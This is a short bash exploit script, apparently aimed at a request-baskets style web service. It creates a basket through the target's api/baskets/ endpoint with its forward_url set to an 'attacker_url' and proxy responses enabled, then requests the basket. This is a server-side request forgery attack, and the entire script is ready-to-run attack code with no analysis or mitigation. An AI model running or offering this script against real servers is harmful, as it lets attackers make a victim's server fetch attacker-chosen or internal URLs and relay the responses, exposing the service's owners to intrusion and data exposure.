#!/usr/bin/bash

if [ "$#" -ne 2 ]; then
    echo "usage: $0 <target_url> <attacker_url>"
    exit 1
fi

target="${1%/}/"
attacker="${2%/}/"

basket=$(uuidgen | cut -c 1-6)

echo -e "\033[1;92m[inf] creating a new basket..\033[0m"

curl -X POST -lvk -d '{"forward_url": "'"$attacker"'","proxy_response": true,"insecure_tls": false,"expand_path": true,"capacity": 250}' -H 'Content-Type: application/json' $target"api/baskets/"$basket

echo -e "\n\n\033[1;92m[inf] accessing the basket..\033[0m"

curl -v $target$basket
